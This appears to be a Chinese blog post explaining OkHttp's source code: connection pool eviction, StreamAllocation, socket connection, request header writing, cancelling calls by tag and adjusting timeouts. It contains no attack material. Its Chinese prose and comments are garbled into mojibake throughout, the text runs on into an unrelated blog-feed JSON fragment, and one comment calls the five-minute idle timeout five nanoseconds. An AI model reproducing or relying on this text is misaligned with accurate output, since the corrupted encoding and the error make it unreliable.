åˆ¤æ–­æ˜¯å¦isEligibleçš„æ–¹æ³•åœ¨RealConnectioné‡Œé¢ // If the non-host fields of the address don&#39;t overlap, we&#39;re done. if (!Internal.instance.equalsNonHost(this.route.address(), address)) return false; // åªè¦DNS,port,protocolsç­‰hostæ— å…³çš„å‚æ•°ä¸­æœ‰ä¸€ä¸ªä¸åŒå°±ä¸èƒ½å¤ç”¨ // If the host exactly matches, we&#39;re done: this connection can carry the address. if (address.url().host().equals(this.route().address().url().host())) { return true; // This connection is a perfect match. } // è¿™é‡Œè¯´æ˜hostæ˜¯ç›¸åŒçš„ï¼Œä¸Šé¢çš„DNSä»€ä¹ˆçš„éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåªæœ‰åé¢çš„path,queryæˆ–è€…RequestBodyä¸åŒï¼Œé‚£ä¹ˆç›´æ¥å¤ç”¨ æ‰€ä»¥è¿™é‡Œsocketå¤ç”¨çš„æ–¹å¼æ˜¯ç›´æ¥ä½¿ç”¨RealConnectionæŒæœ‰Socketå¯¹è±¡çš„å¼•ç”¨ï¼Œæ¯ä¸€æ¬¡åœ¨RealConnectionçš„connectæˆåŠŸåï¼Œéƒ½ä¼šè®²è¿™ä¸ªsocketåŒ…è£…æˆä¸€ä¸ªBufferedSource(è¯»å–Response)å’ŒBufferedSink(å¾€å¤–å†™Request)ï¼Œåœ¨timeoutæ—¶é•¿å†…ï¼Œsocketä¸ä¼šè¢«å…³é—­ã€‚æ—¢ç„¶ç¼“å­˜å°±ä¸€å®šä¼šæœ‰æ¸…ç† åœ¨ä¸Šé¢çš„findHealthyConnectionä¸­æœ‰ä¸€æ®µ streamAllocation.acquire(connection, true); è¿™é‡Œé¢çš„ä½œç”¨å°±æ˜¯å°†è¿™æ¡è¯·æ±‚ï¼ˆStreamï¼‰æ·»åŠ åˆ°å½“å‰è¿æ¥æ‰¿è½½çš„ä¸€ä¸ªList&lt;Reference&gt;ä¸­ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„å¼•ç”¨è®¡æ•°ã€‚æåˆ°è¿™ä¸€ç‚¹æ˜¯è¦è°ˆåˆ°æ¸…ç†çš„å®ç°ï¼šConnectionPoolä¸­æœ‰ä¸€ä¸ªExecutorï¼Œç›®çš„å°±æ˜¯æ‰§è¡Œä¸€ä¸ªcleanupRunnableçš„Runnableï¼Œè¿™é‡Œé¢çš„æ¸…ç†æ“ä½œå¤§è‡´å¦‚ä¸‹ï¼š long cleanup(long now) { // Find either a connection to evict, or the time that the next eviction is due. synchronized (this) { for (Iterator&lt;RealConnection&gt; i = connections.iterator(); i.hasNext(); ) { RealConnection connection = i.next(); // If the connection is in use, keep searching. if (pruneAndGetAllocationCount(connection, now) &gt; 0) { inUseConnectionCount++; //è¿™æ¡è¿æ¥è¿˜åœ¨ç”¨ continue; } idleConnectionCount++; //è¿™æ¡è¿æ¥ç°åœ¨ç©ºé—²ä¸‹æ¥äº† // If the connection is ready to be evicted, we&#39;re done. long idleDurationNs = now - connection.idleAtNanos;// è¿™æ¡è¿æ¥å·²ç»å¤šä¹…æ²¡ç”¨åˆ°äº†ï¼Œå‡å¦‚è¶…è¿‡äº†é—²ç½®æ—¶é—´(é»˜è®¤5çº³ç§’)ï¼Œå°±å‡†å¤‡å¹²æ‰è¿™ä¸ªsocket if (idleDurationNs &gt; longestIdleDurationNs) { longestIdleDurationNs = idleDurationNs; longestIdleConnection = connection; } } // We&#39;ve found a connection to evict. Remove it from the list, then close it below (outside // of the synchronized block). // A connection will be ready to evict soon. // All connections are in use. It&#39;ll be at least the keep alive duration &#39;til we run again. // No connections, idle or in use. } // åœ¨è¿™å‰é¢å¦‚æœæ‰¾ä¸åˆ°ä¸€æ¡è¯¥è¢«å¹²æ‰çš„è¿æ¥ï¼Œç›´æ¥return closeQuietly(longestIdleConnection.socket());// è¿™é‡Œé¢å°±æ˜¯socket.closeäº† // Cleanup again immediately. return 0; } è§‚å¯Ÿä¸€ä¸‹ConnectionPoolçš„æ„é€ å‡½æ•° /** * Create a new connection pool with tuning parameters appropriate for a single-user application. * The tuning parameters in this pool are subject to change in future OkHttp releases. Currently * this pool holds up to 5 idle connections which will be evicted after 5 minutes of inactivity. */ // æœ€å¤šä¿ç•™5æ¡é—²ç½®RealConnection(ä¹Ÿå°±æ˜¯åº•å±‚5ä¸ªSocket),æ¯ä¸ªè¿æ¥(Socket)å¦‚æœè¶…è¿‡5åˆ†é’Ÿæ²¡æœ‰æ¥å®¢ï¼Œç›´æ¥å¹²æ‰ public ConnectionPool() { this(5, 5, TimeUnit.MINUTES); } æ‰€ä»¥ï¼Œåœ¨åˆ›å»ºClientçš„æ—¶å€™ï¼Œå¯ä»¥æŠŠsocketçš„ç¼“å­˜æ•°é‡å†™å¤§ä¸€ç‚¹ï¼Œä¹Ÿå¯ä»¥è‡ªå®šä¹‰ä¸€ä¸ªConnectionPoolï¼Œåªè¦å®ç°äº†put,get,removeç­‰æ ‡å‡†çš„CRDæ“ä½œå°±è¡Œäº†ã€‚ç®€å•æ¥è¯´å°±æ˜¯è‡ªå·±è®¾è®¡ä¸€ä¸ªCacheï¼Œæˆ‘è§‰å¾—å¯ä»¥æ ¹æ®å®é™…çš„endpointæ•°é‡æ¥è®¾å®šç¼“å­˜çš„socketçš„æ•°é‡ã€‚ è¿™é‡Œçš„interceptoræ–¹æ³•å¼‚å¸¸ç®€çŸ­ public Response intercept(Chain chain) throws IOException { RealInterceptorChain realChain = (RealInterceptorChain)chain; Request request = realChain.request(); StreamAllocation streamAllocation = realChain.streamAllocation(); boolean doExtensiveHealthChecks = !request.method().equals(&quot;GET&quot;); HttpCodec httpCodec = streamAllocation.newStream(this.client, doExtensiveHealthChecks); RealConnection connection = streamAllocation.connection(); return realChain.proceed(request, streamAllocation, httpCodec, connection); } è¿™é‡Œé‡ç‚¹å…³æ³¨ StreamAllocationè¿™ä¸ªç±» public final class StreamAllocation { public final Address address; private Route route; private final ConnectionPool connectionPool; private final Object callStackTrace; private final RouteSelector routeSelector; private int refusedStreamCount; private RealConnection connection; private HttpCodec codec; } ä»HttpCodec httpCodec = streamAllocation.newStream(this.client, doExtensiveHealthChecks); è¿™å¥è¯ä¸€ç›´å¾€ä¸‹èµ°ï¼Œä¼šèµ°åˆ°Socket.connect()ï¼Œä¹Ÿå°±æ˜¯å¤§å¤šæ•°äººåˆå­¦ç½‘ç»œç¼–ç¨‹æ—¶è¢«æ•™å¯¼çš„å¦‚ä½•åˆ›å»ºSocketè¿æ¥ã€‚Streamä»£è¡¨ä¸€ä¸ªapiè¯·æ±‚è¿‡ç¨‹ï¼ŒRealConnectionæŒæœ‰äº†çœŸæ­£çš„rawSocketã€‚ StreamAllocation.findConnectionä¸­ä¸»è¦åšäº†1.æŸ¥çœ‹å½“å‰streamAllocationæ˜¯å¦æœ‰ä¹‹å‰å·²ç»åˆ†é…è¿‡çš„è¿æ¥ï¼Œæœ‰åˆ™ç›´æ¥ä½¿ç”¨2.ä»è¿æ¥æ± ä¸­æŸ¥æ‰¾å¯å¤ç”¨çš„è¿æ¥ï¼Œæœ‰åˆ™è¿”å›è¯¥è¿æ¥3.é…ç½®è·¯ç”±ï¼Œé…ç½®åå†æ¬¡ä»è¿æ¥æ± ä¸­æŸ¥æ‰¾æ˜¯å¦æœ‰å¯å¤ç”¨è¿æ¥ï¼Œæœ‰åˆ™ç›´æ¥è¿”å›4.æ–°å»ºä¸€ä¸ªè¿æ¥ï¼Œå¹¶ä¿®æ”¹å…¶StreamAllocationæ ‡è®°è®¡æ•°ï¼Œå°†å…¶æ”¾å…¥è¿æ¥æ± ä¸­5.æŸ¥çœ‹è¿æ¥æ± æ˜¯å¦æœ‰é‡å¤çš„å¤šè·¯å¤ç”¨è¿æ¥ï¼Œæœ‰åˆ™æ¸…é™¤ ä»è¿æ¥æ± ä¸­æ‰¾connectionçš„åˆ¤æ–­æ˜¯ if (connection.isEligible(address, route)) { streamAllocation.acquire(connection, true); return connection; } public boolean isEligible(Address address, @Nullable Route route) { // If this connection is not accepting new streams, we&#39;re done. if (allocations.size() &gt;= allocationLimit || noNewStreams) return false; //æ³¨æ„å•Šï¼Œè‹¥ä¸æ˜¯HTTP/2çš„è¿æ¥ï¼Œåˆ™allocationLimitçš„å€¼æ€»æ˜¯1 ///.... } å¤šä¸ªHTTP/1.1è¯·æ±‚æ˜¯ä¸èƒ½åœ¨åŒä¸€ä¸ªè¿æ¥ä¸Šäº¤å‰å¤„ç†(multiplexing)çš„ï¼Œhttp1ä¸­ä¸€ä¸ªsocketåªèƒ½åŒæ—¶å¤„ç†ä¸€ä¸ªstreamè¯·æ±‚,acquireç±»ä¼¼äºmarkInUseã€‚è¿™æ ·çš„è®¾è®¡ä¸»è¦æ˜¯ä¸ºäº†å®ç°HTTP/2 multi streamï¼Œhttp2æ‰€æœ‰streaméƒ½èµ°ä¸€æ¡tcpè¿æ¥(ä¸€ä¸ªsocket)ã€‚åœ¨Http1Codecçš„endOfInputæ–¹æ³•é‡Œä¼šè°ƒç”¨streamAllocation.streamFinished()æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘è¿™stream(ä¸€æ¬¡æ¥å£è¯·æ±‚è¯»å®Œäº†ï¼Œhttp1æŠ¥æ–‡çš„ç©ºè¡Œè¯»åˆ°äº†)ç”¨å®Œäº†ï¼Œsocketè¿˜ç»™poolï¼Œsocketåœ¨http1åœºæ™¯ä¸‹ä¸€æ¬¡åªèƒ½æ¥ä¸€ä¸ªè¯·æ±‚ã€‚connectionPoolé‡Œé»˜è®¤æ˜¯æœ€å¤§5ä¸ªç©ºé—²è¿æ¥æ•°(å°±æ˜¯è¯´æœ€å¤šåŒæ—¶å­˜åœ¨5ä¸ªæ²¡å…³çš„socket,å¹¶ä¸”æ¯ä¸ªsocketå¦‚æœ5minå†…æ²¡å¹²æ´»ï¼Œå°±å…³é—­æ‰ï¼Œå› ä¸ºsocketä¹Ÿæ˜¯ç³»ç»Ÿèµ„æº)ã€‚ å…³äºRouterSelector.Selectionè¿™ä¸ªclassï¼Œå…¶å®å°±æ˜¯æŠŠDNSè¿”å›çš„å¤šä¸ªæŸ¥è¯¢recordï¼ˆInetSocketAddressï¼Œä¹Ÿå°±æ˜¯ipåœ°å€å­˜èµ·æ¥ï¼Œå½“ç„¶å­˜çš„æ˜¯ä¸€ä¸ªRoute å¯¹è±¡ï¼Œé‡Œå¤´åŒ…ä½äº†InetSocketAddress)ã€‚æ‰€ä»¥å¯ä»¥ç²—ç•¥çš„è®¤ä¸ºä¸€ä¸ªRouterå¯¹åº”ä¸€ä¸ªipåœ°å€å§ï¼ŒRouteDatabaseå°±æ˜¯ä¸€ä¸ªHashSetï¼Œæ¢ipçš„æ—¶å€™ä¼šå¯¹é‚£äº›å¤±è´¥è¿‡çš„Routeï¼ˆipï¼‰èº²å¾—è¿œè¿œçš„ StreamAllocation.newStream â€”-&gt; StreamAllocation.findHealthyConnection â€”&gt; StreamAallocation.findConnection â€”&gt; new RealConnection â€”&gt; RealConnection.connect RealConnection.connect()æ–¹æ³• public void connect(int connectTimeout, int readTimeout, int writeTimeout, boolean connectionRetryEnabled) { if(this.protocol != null) { throw new IllegalStateException(&quot;already connected&quot;); } else { while(true) { try { if(this.route.requiresTunnel()) { this.connectTunnel(connectTimeout, readTimeout, writeTimeout); } else { this.connectSocket(connectTimeout, readTimeout); } break; } catch (IOException var11) { if(!connectionRetryEnabled || !connectionSpecSelector.connectionFailed(var11)) { throw routeException; //è¿™ä¸ªExceptionå°±æ˜¯ç»™RetryAndFollowupInterceptorå‡†å¤‡çš„ } } } } } æœ€åˆå­¦ä¹ Socketç¼–ç¨‹çš„æ—¶å€™ï¼Œå°±æ˜¯å†™äº†ä¸€ä¸ªwhile(true)ï¼Œæ˜¯ä¸æ˜¯å¾ˆåƒï¼Ÿ å¯¹äº†ConnectionPoolå†…éƒ¨ä½¿ç”¨äº†ä¸€ä¸ªDequeä¿å­˜RealConnection,findConnectioné‡Œé¢æœ‰è¿™ä¹ˆä¸€æ®µ Internal.instance.get(this.connectionPool, this.address, this, (Route)null);//æŸ¥æ‰¾ Internal.instance.put(this.connectionPool, result);//æ”¾è¿›pool connectSocketé•¿è¿™æ ·: private void connectSocket(int connectTimeout, int readTimeout) throws IOException { Proxy proxy = this.route.proxy(); Address address = this.route.address(); this.rawSocket = proxy.type() != Type.DIRECT &amp;&amp; proxy.type() != Type.HTTP?new Socket(proxy):address.socketFactory().createSocket(); this.rawSocket.setSoTimeout(readTimeout); try { Platform.get().connectSocket(this.rawSocket, this.route.socketAddress(), connectTimeout); //è¿™é‡Œé¢å°±ä¸€å¥è¯socket.connect } catch (ConnectException var7) { ConnectException ce = new ConnectException(&quot;Failed to connect to &quot; + this.route.socketAddress()); ce.initCause(var7); throw ce; } try { this.source = Okio.buffer(Okio.source(this.rawSocket)); this.sink = Okio.buffer(Okio.sink(this.rawSocket)); } catch (NullPointerException var8) { if(&quot;throw with null exception&quot;.equals(var8.getMessage())) { throw new IOException(var8); } } } é‡ç‚¹çœ‹this.source = Okio.buffer(Okio.source(this.rawSocket));this.sink = Okio.buffer(Okio.sink(this.rawSocket));é€šè¿‡sinkå¾€Socketé‡Œé¢å†™æ•°æ®ï¼Œé€šè¿‡sourceç½‘Socketé‡Œé¢å†™æ•°æ®ï¼Œé€šè¿‡OkioåŒ…è£…äº†ï¼Œè™½ç„¶æœ¬è´¨ä¸Šè¿˜æ˜¯socket.getOutputStreamå’ŒSocket.getInputStreamã€‚åˆ°è¿™ä¸€æ­¥ï¼ŒRealConnectionå†…éƒ¨sinkå’Œsourceåˆå§‹åŒ–å®Œæˆï¼Œsocketå·²ç»è¿æ¥ä¸Šï¼ŒSocketçš„inputStreamå’ŒoutPutStreaméƒ½å‡†å¤‡å°±ç»ªã€‚å…¶å®åœ¨è¿™ç§çŠ¶æ€ä¸‹å°±å·²ç»å¯ä»¥å¼€å§‹è¯»å†™äº†ã€‚ 3.5 CallServerInterceptorè¿™é‡Œå·²ç»è¿ä¸Šäº†æœåŠ¡å™¨ï¼Œå¯ä»¥åƒæ“ä½œæœ¬åœ°æ–‡ä»¶ä¸€æ ·è¯»å†™æ•°æ®äº†ï¼Œå½“ç„¶è¦åœ¨éµå®ˆhttpè§„èŒƒçš„å‰æä¸‹ã€‚ public Response intercept(Chain chain) throws IOException { RealInterceptorChain realChain = (RealInterceptorChain)chain; HttpCodec httpCodec = realChain.httpStream(); StreamAllocation streamAllocation = realChain.streamAllocation(); RealConnection connection = (RealConnection)realChain.connection(); Request request = realChain.request(); //å¯ä»¥çœ‹åˆ°ï¼Œåˆ°è¿™ä¸€æ­¥æ‰€éœ€è¦çš„æ•°æ®éƒ½å‡†å¤‡å°±ç»ª long sentRequestMillis = System.currentTimeMillis(); httpCodec.writeRequestHeaders(request); //å¼€å§‹å†™æ•°æ® Builder responseBuilder = null; if(HttpMethod.permitsRequestBody(request.method()) &amp;&amp; request.body() != null) { //è¿™é‡Œé¢æ˜¯è·ŸPOSTç›¸å…³çš„ if(&quot;100-continue&quot;.equalsIgnoreCase(request.header(&quot;Expect&quot;))) { httpCodec.flushRequest(); responseBuilder = httpCodec.readResponseHeaders(true); } if(responseBuilder == null) { Sink requestBodyOut = httpCodec.createRequestBody(request, request.body().contentLength()); BufferedSink bufferedRequestBody = Okio.buffer(requestBodyOut); request.body().writeTo(bufferedRequestBody); //è¿™é‡Œå°±æ˜¯Okioå‘æŒ¥é«˜æ•ˆçš„åœ°æ–¹ bufferedRequestBody.close(); } else if(!connection.isMultiplexed()) { streamAllocation.noNewStreams(); } } httpCodec.finishRequest(); //åˆ°è¿™é‡Œï¼Œclientçš„æ•°æ®å…¨éƒ¨å†™å®Œå¹¶ä¸”å‘é€ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨å¼€å§‹å¹²æ´»ã€‚ if(responseBuilder == null) { responseBuilder = httpCodec.readResponseHeaders(false); //å¼€å§‹ä»Socketé‡Œé¢è¯»å–æ•°æ® } Response response = responseBuilder.request(request).handshake(streamAllocation.connection().handshake()).sentRequestAtMillis(sentRequestMillis).receivedResponseAtMillis(System.currentTimeMillis()).build(); int code = response.code(); if(this.forWebSocket &amp;&amp; code == 101) { response = response.newBuilder().body(Util.EMPTY_RESPONSE).build(); } else { response = response.newBuilder().body(httpCodec.openResponseBody(response)).build(); } if(&quot;close&quot;.equalsIgnoreCase(response.request().header(&quot;Connection&quot;)) || &quot;close&quot;.equalsIgnoreCase(response.header(&quot;Connection&quot;))) { streamAllocation.noNewStreams(); } if((code == 204 || code == 205) &amp;&amp; response.body().contentLength() &gt; 0L) { throw new ProtocolException(&quot;HTTP &quot; + code + &quot; had non-zero Content-Length: &quot; + response.body().contentLength()); } else { return response; } } è¿™é‡Œé¢å°±æ˜¯ä¸€æ­¥æ­¥çš„å¼€å§‹å†™æ•°æ®äº†ã€‚è¿™é‡Œå†å€Ÿç”¨ä¸‹ç™¾åº¦,chromeæŒ‰ä¸‹F12ï¼Œæ‰“å¼€ç™¾åº¦é¦–é¡µï¼Œçœ‹ä¸‹requestçš„raw header GET / HTTP/1.1 Host: www.baidu.com Connection: keep-alive Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 DNT: 1 Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4 Cookie: PSTM=122178321; BIDUPSID=CF3243290400VSDG52B3859AD4AEC2; BAIDUID=5176CC0A23DB1F3423426454DRTG5EC8:FG=1; MCITY=-%3A; BD_HOME=0; H_PS_PSSID=1428_24320_20930; BD_UPN=1223214323 çœ‹ä¸‹httpCodec.writeRequestHeaders(request)çš„å®ç°ï¼Œå°±ä¼šå‘ç°çœŸçš„æ˜¯è¿™ä¹ˆä¸€è¡Œä¸€è¡Œçš„å†™çš„ä¾‹å¦‚RequestLine.java public static String get(Request request, Type proxyType) { StringBuilder result = new StringBuilder(); result.append(request.method()); // GET result.append(&#39; &#39;); //ç©ºæ ¼ if(includeAuthorityInRequestLine(request, proxyType)) { result.append(request.url()); } else { result.append(requestPath(request.url())); //æˆ‘ä»¬è®¿é—®çš„æ˜¯ç™¾åº¦é¦–é¡µï¼Œå½“ç„¶æ˜¯&#39;/&#39;è¿™ä¸ªIndexå•¦ } result.append(&quot; HTTP/1.1&quot;); //æ˜¯ä¸æ˜¯å’Œä¸Šé¢ä¸€æ¨¡ä¸€æ · return result.toString(); } æ¥ä¸‹æ¥è½®åˆ°Http1Codec.class public void writeRequest(Headers headers, String requestLine) throws IOException { if(this.state != 0) { throw new IllegalStateException(&quot;state: &quot; + this.state); } else { this.sink.writeUtf8(requestLine).writeUtf8(&quot;\\r\\n&quot;); //è¿™æ˜¯ç¬¬ä¸€è¡Œï¼Œå†™å®Œäº†åŠ ä¸Šæ¢è¡Œç¬¦ int i = 0; for(int size = headers.size(); i &lt; size; ++i) { this.sink.writeUtf8(headers.name(i)).writeUtf8(&quot;: &quot;).writeUtf8(headers.value(i)).writeUtf8(&quot;\\r\\n&quot;); //ä¸€ä¸ªheaderå†™å®Œå°±å†™ä¸€ä¸ªæ¢è¡Œç¬¦ } this.sink.writeUtf8(&quot;\\r\\n&quot;); this.state = 1; } } è¯»å–Responseçš„é¡ºåºå’Œå†™Requestç›¸åï¼Œä¸å†èµ˜è¿°ã€‚ 4.ç»“è¯­è¿™é‡Œåªæ˜¯é’ˆå¯¹OkHttpå‘èµ·çš„ä¸€ä¸ªæœ€ç®€å•åŒæ­¥çš„ç½‘ç»œè¯·æ±‚è¿›è¡Œäº†åˆ†æã€‚å…³äºå¼‚æ­¥è¯·æ±‚å†è¯´ä¸¤å¥ï¼šæœ¬è´¨ä¸Šä¸è¿‡æ˜¯åŒ…è£…äº†ä¸€ä¸ªå›è°ƒï¼Œä¸¢åˆ°çº¿ç¨‹æ± é‡Œé¢ï¼Œç›¸æ¯”æ•´ä¸ªHttpè¯·æ±‚ï¼Œå®åœ¨æ˜¯ä¸å€¼ä¸€æã€‚æ¥çœ‹ä¸‹è¿™ä¸ªçº¿ç¨‹æ±  new ThreadPoolExecutor(0, Integer.MAX_VALUE, 60, TimeUnit.SECONDS, new SynchronousQueue&lt;Runnable&gt;(), Util.threadFactory(&quot;OkHttp Dispatcher&quot;, false)); ç…§è¯´jdkä¸æ¨èè¿™ä¹ˆåˆ›å»ºçº¿ç¨‹æ± ï¼Œä¸€èˆ¬ç”¨jdkå°è£…å¥½çš„CachedThreadPoolï¼ŒFixedThreadPoolç­‰ç­‰ï¼Œä½†æƒ³å¿…è¿™æ ·åšä¹Ÿæ˜¯ä¸ä¸ºäº†é€ æˆè¿‡å¤§çš„ç³»ç»Ÿå¼€é”€å§ã€‚debugçš„æ—¶å€™å¦‚æœçœ‹åˆ°OkHttp Dispatcherè¿™æ¡çº¿ç¨‹ï¼Œåº”è¯¥æ˜ç™½æ˜¯ä¸ºä»€ä¹ˆäº†å§ã€‚å¦å¤–ï¼ŒOkioä¼šå¼•å…¥ä¸€æ¡åä¸ºOkio WatchDogçš„çº¿ç¨‹ï¼Œè¿™è·ŸOkioçš„AsyncTimeOutæœ‰å…³ã€‚æ—¶é—´å…³ç³»(å·²ç»æ˜¯å¤œé‡Œ12ç‚¹äº†)ï¼Œä¸æ‰“ç®—ç ”ç©¶äº†ã€‚ OkHttpæ€»é‡è¿‡äºåºå¤§ï¼Œå¾ˆå¤šæ–¹é¢ï¼ŒåŒ…æ‹¬spdy,webSocket,RouterDatabase,DNS,ç½‘ç»œæ‰§è¡Œå‘¨æœŸè§¦å‘å›è°ƒï¼Œhttp2ï¼Œhttpåè®®ï¼Œå¤ªå¤šå¤ªå¤šï¼Œå†ç ”ç©¶ä¸€å¤©ä¹Ÿçœ‹ä¸å®Œã€‚ æ‹å‡ºæ¥å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„ç‚¹å§ï¼š Okioæ”¾åœ¨æœ€å‰é¢ï¼Œå°±æ˜¯ä¸ºäº†è¯´æ˜åœ¨ç½‘ç»œè¯·æ±‚è¿™æ ·å¯¹äºioæ€§èƒ½è¦æ±‚é«˜çš„åœºåˆï¼Œokioé¿å…äº†memory allocationå’Œä¸å¿…è¦çš„ç¼“å­˜å¤åˆ¶ã€‚ OkHttpClientåº”è¯¥æ˜¯å¯¹æ ‡apacheçš„HttpClientçš„ï¼Œåè€…ä¸æ¸…æ¥šã€‚ åº•å±‚è¿˜æ˜¯è°ƒç”¨æ“ä½œç³»ç»Ÿçš„Socketæ¥å£ï¼Œä»è¿™ä¸ªè§’åº¦æ¥çœ‹ï¼ŒRetrofitåªæ˜¯ä¸€ä¸ªUtilï¼ŒåŒ…æ‹¬çº¿ç¨‹è°ƒåº¦éƒ½æ˜¯ç”¨çš„OkHttpçš„çº¿ç¨‹æ± ï¼›Volleyæˆ‘è®°å¾—é»˜è®¤æ˜¯4æ¡NetWorkDispatcherå’Œä¸€ä¸ªCacheDispatcherå’Œä¸€ä¸ªContentDeliveryã€‚ ä¸æ¨èåˆ›å»ºå¤šä¸ªOkHttpClientï¼ŒçœŸæƒ³åˆ›å»ºå¤šä¸ªçš„è¯ï¼Œç”¨newBuilder(æµ…å¤åˆ¶)å°±å¥½äº†å˜›ã€‚ ç½‘ä¸Šè¯´Picasoå†…éƒ¨çš„cacheå…¶å®å°±æ˜¯OkHttpçš„cacheï¼Œä¸æ„§squareå…¨å®¶æ¡¶ç³»åˆ— å’ŒRetrofitä¸€æ ·ï¼Œä¹Ÿæ˜¯ç”¨çš„Builderæ¨¡å¼ï¼Œæä¾›äº†æå¤§çš„è‡ªå®šä¹‰ç©ºé—´ Interceptorï¼Œå¹¿å—ä¸šç•Œå¥½è¯„çš„è´£ä»»é“¾æ¨¡å¼ å†™äº2017å¹´7æœˆ23æ—¥0:29 updateOkHttpæ‹¦æˆªå™¨é‡Œé¢èƒ½ä¸èƒ½æŠŠè¯·æ±‚å–æ¶ˆæ‰? ç»“è®ºå‡ ä¹æ˜¯å¦do-we-have-any-possibility-to-stop-request-in-okhttp-interceptoréšä¾¿æŒ‘ä¸€ä¸ªinterceptorå‡ºæ¥,ä¸Šæ¸¸ä¼ é€’ä¸‹æ¥çš„chainåªèƒ½è·å–åˆ°Requestï¼Œçœ‹äº†ä¸‹,requestå¹¶æ²¡æœ‰ä¸€ä¸ªcancelçš„æ–¹æ³•ã€‚çœŸè¦cancelçš„è¯ï¼Œå¾—å»OkHttpClienté‚£è¾¹å»cancelï¼Œè¿™é‡Œå¹¶ä¸èƒ½è·å¾—ã€‚å°±ç®—ä½ å…¨å±€è·å¾—ä¸€ä¸ªClientï¼Œè¿™é‡Œè¿˜å¾—è¿”å›ä¸€ä¸ªResponseã€‚çœ‹äº†ä¸‹proceedæ–¹æ³•ï¼Œå¦‚æœè¿”å›nullçš„è¯ï¼Œä¼šä¸»åŠ¨æŠ›ä¸€ä¸ªç©ºæŒ‡é’ˆå‡ºæ¥çš„ã€‚ @Override public Response intercept(Chain chain) throws IOException { RealInterceptorChain realChain = (RealInterceptorChain) chain; Request request = realChain.request(); StreamAllocation streamAllocation = realChain.streamAllocation(); // We need the network to satisfy this request. Possibly for validating a conditional GET. boolean doExtensiveHealthChecks = !request.method().equals(&quot;GET&quot;); HttpCodec httpCodec = streamAllocation.newStream(client, chain, doExtensiveHealthChecks); RealConnection connection = streamAllocation.connection(); return realChain.proceed(request, streamAllocation, httpCodec, connection); } cancel ongoing requestCancelling async request by tag //æ¯”å¦‚è¯´ä¸€ä¸ªrequestå‘å‡ºå»çš„æ—¶å€™æ˜¯è¿™æ ·çš„ï¼š Request request = new Request.Builder(). url(url).tag(&quot;this-tag&quot;).build; //è¿™é‡Œé¢å°±æ˜¯ä»dispatcherè®°å½•çš„å½“å‰æ­£åœ¨è¿è¡Œå’Œè¿˜æ²¡æœ‰å¼€å§‹æ‰§è¡Œçš„requestä¸­ä¸€ä¸ªä¸ªå»æ‰¾ã€‚ public void cancel(OkHttpClient client, Object tag) { for (Call call : client.dispatcher().queuedCalls()) { if (tag.equals(call.request().tag())) call.cancel(); } for (Call call : client.dispatcher().runningCalls()) { if (tag.equals(call.request().tag())) call.cancel(); } } ç…äº†ä¸‹call.cancelçš„å®ç°ï¼Œå…¶å®æ˜¯å¯¹RealCallé‡Œé¢çš„æˆå‘˜å˜é‡RetryAndFollowUpInterceptorè°ƒç”¨äº†cancelæ–¹æ³•(å†å¾€åº•å±‚å°±æ˜¯socket.close) è¿™ç§è‡ªå·±ä¸»åŠ¨å–æ¶ˆçš„é”™è¯¯çš„ java.net.SocketException: Socket closedè¶…æ—¶çš„é”™è¯¯æ˜¯ java.net.SocketTimeoutExceptionç½‘ç»œå‡ºé”™çš„é”™è¯¯æ˜¯java.net.ConnectException: Failed to connect to xxxxx åŠ¨æ€è°ƒèŠ‚timeout,ä¹Ÿå°±æ˜¯è¯´éšæ—¶å¯ä»¥ä¿®æ”¹ç½‘ç»œè¯·æ±‚çš„timeout RealInterceptorChain.javaä¸­æœ‰è¿™ä¹ˆä¸‰ä¸ªæ–¹æ³•ï¼ŒInterceptor.Chain withConnectTimeout(int timeout, TimeUnit unit)Interceptor.Chain withReadTimeout(int timeout, TimeUnit unit)Interceptor.Chain withWriteTimeout(int timeout, TimeUnit unit) @Test public void chainWithReadTimeout() throws Exception { Interceptor interceptor1 = new Interceptor() { @Override public Response intercept(Chain chainA) throws IOException { assertEquals(5000, chainA.readTimeoutMillis()); //if ç½‘ç»œè¾ƒå·®ã€‚ã€‚ã€‚ Chain chainB = chainA.withReadTimeout(100, TimeUnit.MILLISECONDS); assertEquals(100, chainB.readTimeoutMillis()); return chainB.proceed(chainA.request()); } }; } æ‰€ä»¥å®Œå…¨å¯ä»¥åœ¨ç½‘ç»œæ¡ä»¶è¾ƒå·®çš„æ—¶å€™ä¿®æ”¹åç»­çš„ç½‘ç»œè¯·æ±‚çš„timeout è®¾è®¡æ¨¡å¼å½“ä¸€ä¸ªç½‘ç»œè¯·æ±‚å‘å‡ºæ—¶,éœ€è¦ç»è¿‡åº”ç”¨å±‚-&gt;ä¼ è¾“å±‚-&gt;ç½‘ç»œå±‚-&gt;è¿æ¥å±‚-&gt;ç‰©ç†å±‚æ”¶åˆ°å“åº”åæ­£å¥½åè¿‡æ¥,ç‰©ç†å±‚-&gt;è¿æ¥å±‚-&gt;ç½‘ç»œå±‚-&gt;ä¼ è¾“å±‚-&gt;åº”ç”¨å±‚åœ¨è¯·æ±‚ç»è¿‡å„å±‚æ—¶,ç”±æ¯å±‚è½®æµå¤„ç†.æ¯å±‚éƒ½å¯ä»¥å¯¹è¯·æ±‚æˆ–å“åº”è¿›è¡Œå¤„ç†.å¹¶å¯ä»¥ä¸­æ–­é“¾æ¥,ä»¥è‡ªèº«ä¸ºç»ˆç‚¹è¿”å›å“åº” 5. å‚è€ƒ Paisy Frodoç³»åˆ— A few ok library Forcing bytes downward in Okio","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"}]},{"title":"æ—¥å¸¸å¼€å‘æ‰‹å†Œ","date":"2017-07-12T08:40:08.000Z","path":"2017/07/12/2017-07-12-android-cookbook/","text":"A Cookbook shall look like a collection of Recipes, or an index page from where dinner are made. And it keeps you sane. githubä¸Šå·²ç»staräº†å››ç™¾å¤šä¸ªé¡¹ç›®ï¼Œåº”è¯¥å¤ä¹ 